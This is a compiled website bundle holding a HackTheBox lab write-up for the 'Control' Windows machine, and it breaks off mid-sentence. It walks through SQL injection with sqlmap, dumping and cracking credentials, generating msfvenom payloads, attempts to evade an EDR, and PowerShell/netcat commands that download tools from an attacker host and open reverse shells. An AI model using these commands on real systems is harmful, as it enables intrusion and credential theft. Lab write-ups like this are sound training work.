"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9415],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),p=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(s.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),d=a,h=u["".concat(s,".").concat(d)]||u[d]||m[d]||o;return n?r.createElement(h,i(i({ref:t},c),{},{components:n})):r.createElement(h,i({ref:t},c))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[u]="string"==typeof e?e:a,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},37686:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={layout:"post",title:"Control ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","web","pe","exploit","htb","services","sql"],date:"2020/04/25",thumbnail:"/img/HackTheBox/control.png",toc:!0},i=void 0,l={unversionedId:"HackTheBox/Control/write-up",id:"HackTheBox/Control/write-up",title:"Control ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Control/write-up.md",sourceDirName:"HackTheBox/Control",slug:"/HackTheBox/Control/write-up",permalink:"/writeups/HackTheBox/Control/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"web",permalink:"/writeups/tags/web"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"services",permalink:"/writeups/tags/services"},{label:"sql",permalink:"/writeups/tags/sql"}],version:"current",frontMatter:{layout:"post",title:"Control ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","web","pe","exploit","htb","services","sql"],date:"2020/04/25",thumbnail:"/img/HackTheBox/control.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Cache ",permalink:"/writeups/HackTheBox/Cache/write-up"},next:{title:"HTB Cyber Santa CTF 2021 - Write-up",permalink:"/writeups/HackTheBox/CyberSantaCTF/2021/write-up"}},s={},p=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"Webapp Enumeration",id:"webapp-enumeration",level:3},{value:"Webapp Exploitation",id:"webapp-exploitation",level:3},{value:"Privilege Escalation : isur to hector",id:"privilege-escalation--isur-to-hector",level:3},{value:"Privilege Escalation : hector to system",id:"privilege-escalation--hector-to-system",level:3},{value:"Files",id:"files",level:3}],c={toc:p},u="wrapper";function m(e){let{components:t,...o}=e;return(0,a.kt)(u,(0,r.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Control"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/218"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Hard"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 40")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"control",src:n(92064).Z,width:"598",height:"381"})),(0,a.kt)("h3",{id:"overview"},"Overview"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Network Enumeration"),": nmap, port 80, 3306"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Webapp Enumeration"),": ",(0,a.kt)("inlineCode",{parentName:"li"},"admin.php"),", ",(0,a.kt)("inlineCode",{parentName:"li"},"X-Forwarded-For")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Webapp Exploitation"),": search products SQLi: dump creds + cmd exec"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Privilege Escalation : isur to hector"),": powershell ",(0,a.kt)("em",{parentName:"li"},"runas")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Privilege Escalation : hector to system"),": bin path SYSTEM service exploit")),(0,a.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": nmap, port 80, 3306"),(0,a.kt)("p",null,"A quick ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan to see which ports are open\n",(0,a.kt)("inlineCode",{parentName:"p"},"nmap -sS -p- -oA nmap_full 10.10.10.167"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Fri Mar 20 23:53:43 2020 as: nmap -sS -p- -oA nmap_full 10.10.10.167\nNmap scan report for 10.10.10.167\nHost is up (0.031s latency).\nNot shown: 65531 filtered ports\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n3306/tcp  open  mysql\n49666/tcp open  unknown\n\n# Nmap done at Fri Mar 20 23:57:58 2020 -- 1 IP address (1 host up) scanned in 254.87 seconds\n")),(0,a.kt)("p",null,"And a second ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan to discover services and versions\n",(0,a.kt)("inlineCode",{parentName:"p"},"nmap -sSVC -p 80,135,3306,49666 10.10.10.167"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PORT      STATE SERVICE VERSION\n80/tcp    open  http    Microsoft IIS httpd 10.0\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc   Microsoft Windows RPC\n3306/tcp  open  mysql?\n| fingerprint-strings:\n|   NULL, oracle-tns:\n|_    Host '10.10.15.52' is not allowed to connect to this MariaDB server\n49667/tcp open  msrpc   Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3306-TCP:V=7.80%I=7%D=3/20%Time=5E7548B5%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.15\\.52'\\x20is\\x20not\\x20allow\nSF:ed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(oracle-tns,4\nSF:A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.15\\.52'\\x20is\\x20not\\x20allowed\\x\nSF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n")),(0,a.kt)("p",null,"The SQL server gives us a connection refused so we'll go with the HTTP server."),(0,a.kt)("h3",{id:"webapp-enumeration"},"Webapp Enumeration"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": ",(0,a.kt)("inlineCode",{parentName:"p"},"admin.php"),", ",(0,a.kt)("inlineCode",{parentName:"p"},"X-Forwarded-For")),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/LL7EUyu.png",alt:null})),(0,a.kt)("p",null,"Optionally you can run a web discovery tool like ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/maurosoria/dirsearch"},"dirsearch")," even\nif not needed here."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Target: 10.10.10.167\n\n[23:56:22] Starting:\n[23:56:22] 403 -  312B  - /%2e%2e/google.com\n[23:56:28] 200 -    8KB - /about.php\n[23:56:30] 200 -   89B  - /admin.php\n[23:56:30] 200 -   89B  - /Admin.php\n[23:56:35] 301 -  150B  - /assets  ->  http://10.10.10.167/assets/\n[23:56:40] 200 -    0B  - /database.php\n[23:56:44] 301 -  150B  - /images  ->  http://10.10.10.167/images/\n[23:56:44] 301 -  150B  - /Images  ->  http://10.10.10.167/Images/\n[23:56:44] 200 -    3KB - /index.php\n[23:56:44] 200 -    3KB - /INDEX.PHP\n[23:56:44] 200 -    3KB - /index.php/login/\n[23:56:44] 200 -    3KB - /index.PHP\n[23:56:45] 200 -   17KB - /license.txt\n[23:56:45] 200 -   17KB - /LICENSE.txt\n[23:56:45] 200 -   17KB - /License.txt\n[23:56:57] 301 -  151B  - /uploads  ->  http://10.10.10.167/uploads/\n[23:56:57] 403 -    1KB - /uploads/\n")),(0,a.kt)("p",null,"If we take a look at the source of ",(0,a.kt)("inlineCode",{parentName:"p"},"index.php")," we can see the following comment:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},"  \x3c!-- To Do:\n    - Import Products\n    - Link to new payment system\n    - Enable SSL (Certificates location \\\\192.168.4.28\\myfiles)\n  \x3c!-- Header --\x3e\n")),(0,a.kt)("p",null,"Very interesting comment that will help us in the near future."),(0,a.kt)("p",null,"Not let's try to reach the ",(0,a.kt)("inlineCode",{parentName:"p"},"admin.php")," page:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ curl http://10.10.10.167/admin.php\nAccess Denied: Header Missing. Please ensure you go through the proxy to access this page\n")),(0,a.kt)("p",null,"We are denied but we are supposed to go through a proxy, so let's add a\n",(0,a.kt)("inlineCode",{parentName:"p"},"X-Forwarded-For")," HTTP header and using an internal address we saw the a comment\nbefore ",(0,a.kt)("inlineCode",{parentName:"p"},"192.168.4.28"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ curl http://10.10.10.167/admin.php -H 'X-Forwarded-For: 192.168.4.28'\n")),(0,a.kt)("p",null,"It works we can access the page but we can do that in ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/burp"},"burp")," in a persistent way\nso we can browse the app in our web browser rather than with curl."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/bN6sATB.png",alt:null})),(0,a.kt)("p",null,"So now we can see this."),(0,a.kt)("p",null,(0,a.kt)("img",{parentName:"p",src:"https://i.imgur.com/RtMZTMn.png",alt:null})),(0,a.kt)("h3",{id:"webapp-exploitation"},"Webapp Exploitation"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": search products SQLi: dump creds + cmd exec"),(0,a.kt)("p",null,"There was a comment ",(0,a.kt)("em",{parentName:"p"},"Import Products")," and also a SQL database from the nmap scan\nso we can try a SQL injection (SQLi)."),(0,a.kt)("p",null,"I used ",(0,a.kt)("a",{parentName:"p",href:"https://sqlmap.org"},"sqlmap")," (not forgetting to add the ",(0,a.kt)("inlineCode",{parentName:"p"},"X-Forwarded-For")," header) to\nexploit the SQLi."),(0,a.kt)("p",null,"First, let's list tables:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' --tables -H 'X-Forwarded-For: 192.168.4.28'\n\n[00:29:49] [INFO] fetching tables for databases: 'information_schema, mysql, warehouse'\nDatabase: information_schema\n[77 tables]\n...\n\nDatabase: mysql\n[31 tables]\n+---------------------------------------+\n| user                                  |\n| column_stats                          |\n| columns_priv                          |\n| db                                    |\n| event                                 |\n| func                                  |\n| general_log                           |\n| global_priv                           |\n| gtid_slave_pos                        |\n| help_category                         |\n| help_keyword                          |\n| help_relation                         |\n| help_topic                            |\n| index_stats                           |\n| innodb_index_stats                    |\n| innodb_table_stats                    |\n| plugin                                |\n| proc                                  |\n| procs_priv                            |\n| proxies_priv                          |\n| roles_mapping                         |\n| servers                               |\n| slow_log                              |\n| table_stats                           |\n| tables_priv                           |\n| time_zone                             |\n| time_zone_leap_second                 |\n| time_zone_name                        |\n| time_zone_transition                  |\n| time_zone_transition_type             |\n| transaction_registry                  |\n+---------------------------------------+\n\nDatabase: warehouse\n[3 tables]\n+---------------------------------------+\n| product                               |\n| product_category                      |\n| product_pack                          |\n+---------------------------------------+\n")),(0,a.kt)("p",null,"We can dump users credentials stored in table ",(0,a.kt)("inlineCode",{parentName:"p"},"user")," from database ",(0,a.kt)("inlineCode",{parentName:"p"},"mysql"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' -D mysql -T user --dump -C User,Password\n\n+---------+-------------------------------------------+\n| User    | Password                                  |\n+---------+-------------------------------------------+\n| hector  | *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D |\n| manager | *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA |\n| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |\n| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |\n| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |\n| root    | *0A4A5CAD344718DC418035A1F4D292BA603134D8 |\n+---------+-------------------------------------------+\n")),(0,a.kt)("p",null,"Great, ",(0,a.kt)("a",{parentName:"p",href:"https://sqlmap.org"},"sqlmap")," was able to crack 2 hashes with it's embedded automatic\nbruteforce:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"manager")," / ",(0,a.kt)("inlineCode",{parentName:"li"},"l3tm3!n")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"hector")," / ",(0,a.kt)("inlineCode",{parentName:"li"},"l33th4x0rhector"))),(0,a.kt)("p",null,"For your information here are the various methods ",(0,a.kt)("a",{parentName:"p",href:"https://sqlmap.org"},"sqlmap")," was able\nto exploit:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"Parameter: productName (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)\n    Payload: productName=-7611' OR 8249=8249#\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: productName=toto' AND (SELECT 1413 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(1413=1413,1))),0x7176786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dkpS\n\n    Type: stacked queries\n    Title: MySQL >= 5.0.12 stacked queries (comment)\n    Payload: productName=toto';SELECT SLEEP(5)#\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: productName=toto' AND (SELECT 7102 FROM (SELECT(SLEEP(5)))ETMY)-- bIbM\n\n    Type: UNION query\n    Title: MySQL UNION query (NULL) - 6 columns\n    Payload: productName=toto' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178717671,0x5665716b58786a4955776773767048694661436950414263626c756b56717243616f6d59796b4f66,0x7176786a71),NULL#\n")),(0,a.kt)("p",null,"In order to avoid time-based queries we can use the ",(0,a.kt)("inlineCode",{parentName:"p"},"--technique BEUS")," option."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' --os-pwn --dbms mysql --tmp-path 'C:/Windows/Temp/' --random-agent --priv-esc --web-root 'C:/Inetpub/wwwroot/' --technique BEUS\n")),(0,a.kt)("p",null,"I tried to get a reverse shell with ",(0,a.kt)("inlineCode",{parentName:"p"},"--os-pwn")," directly but something when wrong\nso let's try a more manual approach."),(0,a.kt)("p",null,"Let's use ",(0,a.kt)("inlineCode",{parentName:"p"},"--sql-shell")," to be able to run some SQL queries."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' --dbms mysql --sql-shell\n\nselect load_file('C:/WINDOWS/system32/drivers/etc/hosts'): '# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\\r\\n#\\r\\n# This file contains the mappings of IP addresses to host names. Each\\r\\n# entry should be kept on an individual line. The IP address should\\r\\n# be placed in the first column followed by the corresponding host name.\\r\\n# The IP address and the host name should be separated by at least one\\r\\n# space.\\r\\n#\\r\\n# Additionally, comments (such as these) may be inserted on individual\\r\\n# lines or following the machine name denoted by a '#' symbol.\\r\\n#\\r\\n# For example:\\r\\n#\\r\\n#      102.54.94.97     rhino.acme.com          # source server\\r\\n#       38.25.63.10     x.acme.com              # x client host\\r\\n\\r\\n# localhost name resolution is handled within DNS itself.\\r\\n#\\t127.0.0.1       localhost\\r\\n#\\t::1             localhost\\r\\n'\n")),(0,a.kt)("p",null,"With ",(0,a.kt)("inlineCode",{parentName:"p"},"select load_file('C:/WINDOWS/system32/drivers/etc/hosts')")," it try to see\nif we can read files and it's working!"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"[17:26:33] [INFO] fetching SQL SELECT statement query output: 'select user()'\nselect user(): 'manager@localhost'\n")),(0,a.kt)("p",null,"The current user is ",(0,a.kt)("inlineCode",{parentName:"p"},"manager"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"[17:35:28] [INFO] fetching SQL SELECT statement query output: 'select version()'\nselect version(): '10.4.8-MariaDB'\n")),(0,a.kt)("p",null,"The MySQL implementation is MariaDB."),(0,a.kt)("p",null,"Let's check the users' privileges."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sqlmap -u http://10.10.10.167/search_products.php --method POST -p productName --data 'productName=toto' -H 'X-Forwarded-For: 192.168.4.28' --dbms mysql --privileges\n\n[17:52:11] [INFO] fetching database users privileges\ndatabase management system users privileges:\n[*] 'hector'@'localhost' (administrator) [29]:\n    privilege: ALTER\n    privilege: ALTER ROUTINE\n    privilege: CREATE\n    privilege: CREATE ROUTINE\n    privilege: CREATE TABLESPACE\n    privilege: CREATE TEMPORARY TABLES\n    privilege: CREATE USER\n    privilege: CREATE VIEW\n    privilege: DELETE\n    privilege: DELETE HISTORY\n    privilege: DROP\n    privilege: EVENT\n    privilege: EXECUTE\n    privilege: FILE\n    privilege: INDEX\n    privilege: INSERT\n    privilege: LOCK TABLES\n    privilege: PROCESS\n    privilege: REFERENCES\n    privilege: RELOAD\n    privilege: REPLICATION CLIENT\n    privilege: REPLICATION SLAVE\n    privilege: SELECT\n    privilege: SHOW DATABASES\n    privilege: SHOW VIEW\n    privilege: SHUTDOWN\n    privilege: SUPER\n    privilege: TRIGGER\n    privilege: UPDATE\n[*] 'manager'@'localhost' [1]:\n    privilege: FILE\n[*] 'root'@'127.0.0.1' (administrator) [29]:\n    privilege: ALTER\n    privilege: ALTER ROUTINE\n    privilege: CREATE\n    privilege: CREATE ROUTINE\n    privilege: CREATE TABLESPACE\n    privilege: CREATE TEMPORARY TABLES\n    privilege: CREATE USER\n    privilege: CREATE VIEW\n    privilege: DELETE\n    privilege: DELETE HISTORY\n    privilege: DROP\n    privilege: EVENT\n    privilege: EXECUTE\n    privilege: FILE\n    privilege: INDEX\n    privilege: INSERT\n    privilege: LOCK TABLES\n    privilege: PROCESS\n    privilege: REFERENCES\n    privilege: RELOAD\n    privilege: REPLICATION CLIENT\n    privilege: REPLICATION SLAVE\n    privilege: SELECT\n    privilege: SHOW DATABASES\n    privilege: SHOW VIEW\n    privilege: SHUTDOWN\n    privilege: SUPER\n    privilege: TRIGGER\n    privilege: UPDATE\n")),(0,a.kt)("p",null,"It seems our current user ",(0,a.kt)("em",{parentName:"p"},"manager")," is less privileged than ",(0,a.kt)("em",{parentName:"p"},"root")," or ",(0,a.kt)("em",{parentName:"p"},"hector"),"\nbut still has the ",(0,a.kt)("em",{parentName:"p"},"FILE")," perm that allowed use to read\n",(0,a.kt)("inlineCode",{parentName:"p"},"C:/WINDOWS/system32/drivers/etc/hosts"),"."),(0,a.kt)("p",null,"As I said earlier ",(0,a.kt)("inlineCode",{parentName:"p"},"--os-pwn")," was not working so I tried ",(0,a.kt)("inlineCode",{parentName:"p"},"--os-shell")," to run\nsome command manually."),(0,a.kt)("p",null,"I generated (locally) a ",(0,a.kt)("inlineCode",{parentName:"p"},"meterpreter")," reverse shell."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=9999 -f exe > win.exe\n")),(0,a.kt)("p",null,"And tried to upload it will powershell in the ",(0,a.kt)("inlineCode",{parentName:"p"},"os-shell")," session."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'os-shell> powershell -nop -c "wget http://10.10.14.34:8080/win.exe -OutFile uploads\\win.exe"\n')),(0,a.kt)("p",null,"Unfortunately, there is an EDR blocking and removing our reverse shell."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"'The system cannot execute the specified program.'\n")),(0,a.kt)("p",null,"I persisted and tried with various encoders or without meterpreter."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe -e shikata_ga_nai -i 3 > win.exe\n-> spotted\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe -e shikata_ga_nai -i 4100 > win.exe\n-> spotted\n\nmsfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.34 LPORT=8080 -f exe > win.exe\n-> spotted\n")),(0,a.kt)("p",null,"I found ",(0,a.kt)("a",{parentName:"p",href:"https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1"},"a manual obfuscation method with raw python")," that claimed to work 100%\nof the time but it was overkill and too time consuming to do AV evasion."),(0,a.kt)("p",null,"Else is tried to upload ",(0,a.kt)("inlineCode",{parentName:"p"},"nc.exe"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cp ~/CTF/tools/kali-windows-binaries/nc.exe .\n")),(0,a.kt)("p",null,"Note: the pre-compiled binary can be found here:\n",(0,a.kt)("a",{parentName:"p",href:"https://github.com/interference-security/kali-windows-binaries"},"interference-security/kali-windows-binaries"),"."),(0,a.kt)("p",null,"So I uploaded it and created a powershell session:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'os-shell> powershell -nop -c "wget http://10.10.15.123:8080/nc.exe -OutFile uploads\\nc.exe"\nos-shell> uploads\\nc.exe 10.10.15.123 9999 -e powershell.exe\n')),(0,a.kt)("p",null,"Yey, the listener caught it without being spotted by the EDR:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ nc -nlp 9999\nMicrosoft Windows [Version 10.0.17763.805]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\inetpub\\wwwroot>whoami\nnt authority\\iusr\n\nC:\\inetpub\\wwwroot>\n")),(0,a.kt)("p",null,"Ok so we are logged as ",(0,a.kt)("inlineCode",{parentName:"p"},"nt authority\\iusr"),", a service account."),(0,a.kt)("h3",{id:"privilege-escalation--isur-to-hector"},"Privilege Escalation : isur to hector"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": powershell ",(0,a.kt)("em",{parentName:"p"},"runas")),(0,a.kt)("p",null,"So we may need to log as ",(0,a.kt)("em",{parentName:"p"},"hector")," or ",(0,a.kt)("em",{parentName:"p"},"manager")," to see interesting stuff."),(0,a.kt)("p",null,"But ",(0,a.kt)("inlineCode",{parentName:"p"},"runas")," tricks like this one never works outside a true graphical terminal."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"cmd /C echo l33th4x0rhector | runas /user:hector /netonly cmd.exe\n")),(0,a.kt)("p",null,"So I had to figure out how to do it in powershell."),(0,a.kt)("p",null,"Before let's check detailed permissions:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"C:\\inetpub\\wwwroot>whoami /all\nwhoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name         SID     \n================= ========\nnt authority\\iusr S-1-5-17\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                           Type             SID          Attributes                                        \n==================================== ================ ============ ==================================================\nMandatory Label\\High Mandatory Level Label            S-1-16-12288                                                   \nEveryone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          \nCONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nLOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name          Description                               State  \n======================= ========================================= =======\nSeChangeNotifyPrivilege Bypass traverse checking                  Enabled\nSeImpersonatePrivilege  Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege Create global objects                     Enabled\n\nERROR: Unable to get user claims information.\n")),(0,a.kt)("p",null,"I found the following tricks on ",(0,a.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/"},"Hack Tricks"),", on this ",(0,a.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#sudo"},"page"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"# create a credential object\n$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('CONTROL\\Hector', $pass)\n# check if credentials are working executing\nInvoke-Command -Computer Fidelity -ScriptBlock { whoami } -Credential $cred\n# Now the real command\nInvoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd /c \"C:\\inetpub\\wwwroot\\uploads\\nc.exe -e powershell 10.10.15.123 10000\" }\n")),(0,a.kt)("p",null,"I lost hours at this step. Why?"),(0,a.kt)("p",null,"Because of troll from the challenge author."),(0,a.kt)("p",null,"The ",(0,a.kt)("inlineCode",{parentName:"p"},"Invoke-Command")," command requires the right hostname to work even if it is\nlocalhost else it fails with an obscure error."),(0,a.kt)("p",null,"When you get the hostname of the machine in a classic way, or with enumeration\ntool or if you guess that the name of the HTB box, you will think that the\nhostname is ",(0,a.kt)("inlineCode",{parentName:"p"},"CONTROL")," right?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PS C:\\inetpub\\wwwroot> gc env:computername\nCONTROL\n\nPS C:\\inetpub\\wwwroot> $env:computername\nCONTROL\n\nc:\\>echo %computername%\nCONTROL\n")),(0,a.kt)("p",null,"Not at all, I don't understand why but the legacy ",(0,a.kt)("inlineCode",{parentName:"p"},"Hostname.exe")," returns\n",(0,a.kt)("inlineCode",{parentName:"p"},"Fidelity"),", same in powershell.."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"PS C:\\inetpub\\wwwroot> Hostname.exe\nFidelity\n\nPS C:\\inetpub\\wwwroot> 